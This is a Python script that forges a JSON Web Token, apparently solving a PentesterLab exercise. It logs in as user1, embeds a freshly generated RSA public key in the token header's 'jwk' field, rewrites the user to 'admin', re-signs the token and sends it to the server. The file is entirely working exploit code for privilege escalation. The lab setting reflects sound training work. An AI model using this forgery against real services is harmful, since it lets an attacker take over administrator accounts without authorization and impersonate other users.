from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from requests import Request, api, Session
from base64 import b64decode, b64encode
from json import dumps, loads

# Convert int to bytes
def int2b(num):
    return num.to_bytes((num.bit_length()+7)//8, 'big')

# Convert text to base64 with safe URL encoding
def urlb64e(txt):
    return b64encode(txt).rstrip(b"=").decode()

# Convert base64 safe url encoded to text
def url64d(b64text):
    return b64decode(b64text + '=' * (-len(b64text) % 4)).decode()


key = RSA.generate(2048)

# Log in 
s = Session()
data = {
        "username" : "user1",
        "password" : "qwe123"
}
rq= Request('POST', 'http://somewhere/login', data=data)
ans = s.send(rq.prepare())

# Get JWT
cookies = {
        "auth" : s.cookies.values()[0]
}

# Decode and modify the JWT
header, payload, sig = cookies['auth'].split('.')
d_header = loads(url64d(header))
d_payload= url64d(payload)

d_header['alg'] = 'RS256'
d_header['jwk'] = {
        "kty" : "RSA",
        "kid" : "pentesterlab",
        "use" : "sig",
        "n"   : urlb64e(int2b(key.n)),
        "e"   : urlb64e(int2b(key.e))
}

d_payload = d_payload.replace("user1", "admin").encode()
d_header.pop('kid')
d_header  = dumps(d_header).replace(" ", "").encode()

# Join new header and payload
newContent = urlb64e(d_header) + '.' + urlb64e(d_payload)

# New signature
signer = pkcs1_15.new(key)
hashfunc = SHA256.new()
hashfunc.update(newContent.encode())
new_sig = signer.sign(hashfunc)
new_jwt = newContent + "." + urlb64e(new_sig)

# Another way to sign using RSA
#from hashlib import sha256
#tmphash = int.from_bytes(sha256(newContent.encode()).digest(), byteorder='big')
#signature = urlb64e(int2b(pow(tmphash, key.d, key.n)))
#new_jwt = newContent + "." + signature

# Send request with newly generated token
resp= api.get('http://somewhere', cookies={'auth' : new_jwt})
print(resp.text)
